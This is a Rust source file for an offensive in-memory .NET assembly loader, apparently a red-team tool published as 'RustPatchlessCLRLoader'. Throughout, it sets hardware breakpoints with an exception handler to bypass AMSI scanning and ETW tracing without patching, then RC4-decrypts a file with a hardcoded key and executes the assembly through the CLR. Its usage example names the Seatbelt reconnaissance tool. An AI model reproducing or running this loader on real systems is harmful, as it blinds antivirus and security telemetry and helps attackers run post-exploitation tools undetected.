#![allow(non_snake_case,non_camel_case_types, unused_imports)]

use std::ffi::CString;
use std::ptr::null_mut;
use winapi::ctypes::c_void; 
use std::mem::zeroed;
use std::mem;

use winapi::shared::{
    minwindef::ULONG,
    ntdef::{NT_SUCCESS, NTSTATUS, OBJECT_ATTRIBUTES},
    ntstatus::STATUS_SUCCESS,

};

use winapi::um::{
    errhandlingapi::AddVectoredExceptionHandler,
    libloaderapi::{GetProcAddress, GetModuleHandleA, LoadLibraryA},
    winnt::{EXCEPTION_POINTERS, CONTEXT, LONG, CONTEXT_ALL, HANDLE, ACCESS_MASK, THREAD_ALL_ACCESS,PVOID},
    minwinbase::EXCEPTION_SINGLE_STEP,
};
use ntapi::{
    ntexapi::{SYSTEM_PROCESS_INFORMATION, SYSTEM_THREAD_INFORMATION, SystemProcessInformation},
    ntpsapi::PROCESS_BASIC_INFORMATION,
};

use winapi::vc::excpt::{EXCEPTION_CONTINUE_EXECUTION,EXCEPTION_CONTINUE_SEARCH};

use clroxide::clr::Clr;
use std::{env, fs, process::exit};
use sysinfo::System;
use std::{process, pin};
use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
use std::{fs::File, io::Read};
use rc4::{Rc4, KeyInit, StreamCipher};
use windows::core::{s, PCSTR};
use base64;
use std::os::raw::{c_ulong};

const S_OK: i32 = 0;
const AMSI_RESULT_CLEAN: i32 = 0;
static mut AMSI_SCAN_BUFFER_PTR: Option<*mut u8> = None;
static mut NT_TRACE_CONTROL_PTR: Option<*mut u8> = None;

#[repr(C)]
struct CLIENT_ID {
    UniqueProcess: *mut c_void,
    UniqueThread: *mut c_void,
}

extern "stdcall" {

    fn NtGetContextThread(
        thread_handle: HANDLE,
        thread_context: *mut CONTEXT,
    ) -> ULONG;

    fn NtSetContextThread(
        thread_handle: HANDLE,
        thread_context: *mut CONTEXT,
    ) -> ULONG;
    fn NtQuerySystemInformation(
        SystemInformationClass: ULONG,
        SystemInformation: *mut c_void,
        SystemInformationLength: ULONG,
        ReturnLength: *mut ULONG,
    ) -> NTSTATUS;
    fn NtQueryInformationProcess(
        ProcessHandle: HANDLE,
        ProcessInformationClass: ULONG,
        ProcessInformation: *mut c_void,
        ProcessInformationLength: ULONG,
        ReturnLength: *mut ULONG,
    ) -> NTSTATUS;
    fn NtOpenThread(
        ThreadHandle: *mut HANDLE,
        DesiredAccess: ACCESS_MASK,
        ObjectAttributes: *const OBJECT_ATTRIBUTES,
        ClientId: *const CLIENT_ID,
    ) -> NTSTATUS;
    fn NtClose(Handle: HANDLE) -> NTSTATUS;

}

fn set_bits(dw: u64, low_bit: i32, bits: i32, new_value: u64) -> u64 {
    let mask = (1 << bits) - 1;
    (dw & !(mask << low_bit)) | (new_value << low_bit)
}

fn clear_breakpoint(ctx: &mut CONTEXT, index: i32) {
    match index {
        0 => ctx.Dr0 = 0,
        1 => ctx.Dr1 = 0,
        2 => ctx.Dr2 = 0,
        3 => ctx.Dr3 = 0,
        _ => {}
    }
    ctx.Dr7 = set_bits(ctx.Dr7, (index * 2) as i32, 1, 0);
    ctx.Dr6 = 0;
    ctx.EFlags = 0;
}

fn enable_breakpoint(ctx: &mut CONTEXT, address: *mut u8, index: i32) {
    match index {
        0 => ctx.Dr0 = address as u64,
        1 => ctx.Dr1 = address as u64,
        2 => ctx.Dr2 = address as u64,
        3 => ctx.Dr3 = address as u64,
        _ => {}
    }
    ctx.Dr7 = set_bits(ctx.Dr7, 16, 16, 0);
    ctx.Dr7 = set_bits(ctx.Dr7, (index * 2) as i32, 1, 1);
    ctx.Dr6 = 0;
}

fn get_arg(ctx: &CONTEXT, index: i32) -> usize {
    match index {
        0 => ctx.Rcx as usize,
        1 => ctx.Rdx as usize,
        2 => ctx.R8 as usize,
        3 => ctx.R9 as usize,
        _ => unsafe { *((ctx.Rsp as *const u64).offset((index + 1) as isize) as *const usize) }
    }
}

fn get_return_address(ctx: &CONTEXT) -> usize {
    unsafe { *((ctx.Rsp as *const u64) as *const usize) }
}

fn set_result(ctx: &mut CONTEXT, result: usize) {
    ctx.Rax = result as u64;
}

fn adjust_stack_pointer(ctx: &mut CONTEXT, amount: i32) {
    ctx.Rsp += amount as u64;
}

fn set_ip(ctx: &mut CONTEXT, new_ip: usize) {
    ctx.Rip = new_ip as u64;
}

unsafe extern "system" fn exception_handler(exceptions: *mut EXCEPTION_POINTERS) -> LONG {
    unsafe {
        let context = &mut *(*exceptions).ContextRecord;
        let exception_code = (*(*exceptions).ExceptionRecord).ExceptionCode;
        let exception_address = (*(*exceptions).ExceptionRecord).ExceptionAddress as usize;

        if exception_code == EXCEPTION_SINGLE_STEP {
            if let Some(amsi_address) = AMSI_SCAN_BUFFER_PTR {
                if exception_address == amsi_address as usize {
                    println!("[+] AMSI Bypass invoked at address: {:#X}", exception_address);
                    let return_address = get_return_address(context);
                    let scan_result_ptr = get_arg(context, 5) as *mut i32;
                    *scan_result_ptr = AMSI_RESULT_CLEAN;

                    set_ip(context, return_address);
                    adjust_stack_pointer(context, std::mem::size_of::<*mut u8>() as i32);
                    set_result(context, S_OK as usize);

                    clear_breakpoint(context, 0);
                    return EXCEPTION_CONTINUE_EXECUTION;
                }
            }

            if let Some(nt_trace_address) = NT_TRACE_CONTROL_PTR {
                if exception_address == nt_trace_address as usize {
                    println!("[+] NtTraceControl Bypass invoked at address: {:#X}", exception_address);
                    if let Some(new_rip) = find_gadget(exception_address, b"\xc3", 1, 500) {
                        context.Rip = new_rip as u64;
                    }

                    clear_breakpoint(context, 1);
                    return EXCEPTION_CONTINUE_EXECUTION;
                }
            }
        }

        EXCEPTION_CONTINUE_SEARCH
    }
}

fn find_gadget(function: usize, stub: &[u8], size: usize, dist: usize) -> Option<usize> {
    for i in 0..dist {
        unsafe {
            let ptr = function + i;
            if std::slice::from_raw_parts(ptr as *const u8, size) == stub {
                return Some(ptr);
            }
        }
    }
    None
}

fn GetCurrentProcessId() -> u32 {
    let pseudo_handle = -1isize as HANDLE;
    let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { zeroed() };
    let status = unsafe {
        NtQueryInformationProcess(
            pseudo_handle,
            0,
            &mut pbi as *mut _ as *mut c_void,
            mem::size_of::<PROCESS_BASIC_INFORMATION>() as ULONG,
            null_mut())
    };
    
    if status != STATUS_SUCCESS {
        1
    } else {
        
        pbi.UniqueProcessId as u32
    }
}

fn setup_bypass() -> Result<*mut c_void, String> {
    let mut thread_ctx: CONTEXT = unsafe { std::mem::zeroed() };
    thread_ctx.ContextFlags = CONTEXT_ALL;

    unsafe {
        if AMSI_SCAN_BUFFER_PTR.is_none() {
            let module_name = CString::new("amsi.dll").unwrap();

            let mut module_handle = GetModuleHandleA(module_name.as_ptr());

            if module_handle.is_null() {
                module_handle = LoadLibraryA(module_name.as_ptr());
                if module_handle.is_null() {
                    return Err("Failed to load amsi.dll".to_string());
                }
            }

            let function_name = CString::new("AmsiScanBuffer").unwrap();
            let amsi_scan_buffer = GetProcAddress(module_handle, function_name.as_ptr());

            if amsi_scan_buffer.is_null() {
                return Err("Failed to get address for AmsiScanBuffer".to_string());
            }

            AMSI_SCAN_BUFFER_PTR = Some(amsi_scan_buffer as *mut u8);
        }

        if NT_TRACE_CONTROL_PTR.is_none() {
            let ntdll_module_name = CString::new("ntdll.dll").unwrap();
            let ntdll_module_handle = GetModuleHandleA(ntdll_module_name.as_ptr());

            let ntdll_function_name = CString::new("NtTraceControl").unwrap();
            let ntdll_function_ptr = GetProcAddress(ntdll_module_handle, ntdll_function_name.as_ptr());
            if ntdll_function_ptr.is_null() {
                return Err("Failed to get address for NtTraceControl".to_string());
            }

            NT_TRACE_CONTROL_PTR = Some(ntdll_function_ptr as *mut u8);
        }
    }

    let h_ex_handler = unsafe {
        AddVectoredExceptionHandler(1, Some(exception_handler))
    };

    let process_id = GetCurrentProcessId();
    let thread_handles = get_remote_thread_handle(process_id)?; 

    for thread_handle in &thread_handles {
        if unsafe { NtGetContextThread(thread_handle.clone(), &mut thread_ctx) } != 0 {
            return Err("Failed to get thread context".to_string());
        }
        unsafe {
            if let Some(amsi_ptr) = AMSI_SCAN_BUFFER_PTR {
                enable_breakpoint(&mut thread_ctx, amsi_ptr, 0);
            }
            if let Some(nt_trace_ptr) = NT_TRACE_CONTROL_PTR {
                enable_breakpoint(&mut thread_ctx, nt_trace_ptr, 1);
            }
        }

        if unsafe { NtSetContextThread(thread_handle.clone(), &mut thread_ctx) } != 0 {
            return Err("Failed to set thread context".to_string());
        }
        unsafe{NtClose(thread_handle.clone())};

    }
    Ok(h_ex_handler)
}

fn get_remote_thread_handle(process_id: u32) -> Result<Vec<HANDLE>, String> {
    let mut buffer: Vec<u8> = Vec::with_capacity(1024 * 1024);
    let mut return_length: ULONG = 0;

    let status = unsafe {
        NtQuerySystemInformation(
            SystemProcessInformation,
            buffer.as_mut_ptr() as *mut c_void,
            buffer.capacity() as ULONG,
            &mut return_length
        )
    };

    if !NT_SUCCESS(status) {
        return Err("Failed to call NtQuerySystemInformation".to_owned());
    }

    unsafe {
        buffer.set_len(return_length as usize);
    }

    let mut offset: usize = 0;
    let mut thread_handles: Vec<HANDLE> = Vec::new();

    while offset < buffer.len() {
        let process_info: &SYSTEM_PROCESS_INFORMATION = unsafe { &*(buffer.as_ptr().add(offset) as *const SYSTEM_PROCESS_INFORMATION) };

        if process_info.UniqueProcessId == process_id as PVOID {
            let thread_array_base = (process_info as *const _ as usize) + std::mem::size_of::<SYSTEM_PROCESS_INFORMATION>() - std::mem::size_of::<SYSTEM_THREAD_INFORMATION>();

            for i in 0..process_info.NumberOfThreads as usize {
                let thread_info_ptr = (thread_array_base + i * std::mem::size_of::<SYSTEM_THREAD_INFORMATION>()) as *const SYSTEM_THREAD_INFORMATION;
                let thread_info = unsafe { &*thread_info_ptr };

                let mut thread_handle: HANDLE = null_mut();
                let mut object_attrs: OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
                let mut client_id: CLIENT_ID = unsafe { std::mem::zeroed() };
                client_id.UniqueThread = thread_info.ClientId.UniqueThread;

                let status = unsafe {
                    NtOpenThread(
                        &mut thread_handle,
                        THREAD_ALL_ACCESS,
                        &mut object_attrs,
                        &mut client_id
                    )
                };

                if NT_SUCCESS(status) {
                    thread_handles.push(thread_handle);
                }
            }
        }

        if process_info.NextEntryOffset == 0 {
            break;
        }
        offset += process_info.NextEntryOffset as usize;
    }

    if thread_handles.is_empty() {
        return Err("Failed to find any threads".to_owned());
    }

    Ok(thread_handles)
}

fn read_file(filename: &str) -> Vec<u8> {
    let mut file = File::open(filename).expect("Failed to open file");
    let mut contents = Vec::new();
    file.read_to_end(&mut contents).expect("Failed to read file");
    contents
  }
  
  fn decrypt_rc4(filename: &str) -> Vec<u8> {
    let mut buf = read_file(filename);
    let mut rc4 = Rc4::new(b"C2Pain".into());
  
    rc4.apply_keystream(&mut buf);
  
    buf
  }

fn prepare_args() -> (String, Vec<String>) {
    let mut args: Vec<String> = env::args().collect();

    if args.len() < 2 {
        println!("[!] Usage: {} <RC4 Encrypted File> <Arguments>", args[0]);
        println!("[!] Example: {} S-e-a-t-b-e-l-t-4.enc AntiVirus", args[0]);
        exit(1)
    }

    let mut command_args: Vec<String> = vec![];

    if args.len() > 2 {
        command_args = args.split_off(2)
    }

    let path = args[1].clone();

    println!("[+] Running {} with args: {:?}", path, command_args);

    return (path, command_args);
}
fn main() -> Result<(), String> {
    println!("[+] RustPatchlessCLRLoader by C2Pain.");
    println!("[+] Github: https://github.com/c2pain/RustPatchlessCLRLoader");
    let (path, args) = prepare_args();
    
    match setup_bypass() {
      Ok(_) => {
          let shellcode = decrypt_rc4(&path);
          let mut clr = Clr::new(shellcode, args)?;
          let results = clr.run()?;
          println!("[+] Results:\n\n{}", results);
          process::exit(0);
      },
      Err(err_msg) => {
          println!("Error during verification: {}", err_msg);
      }
   }
    Ok(())
}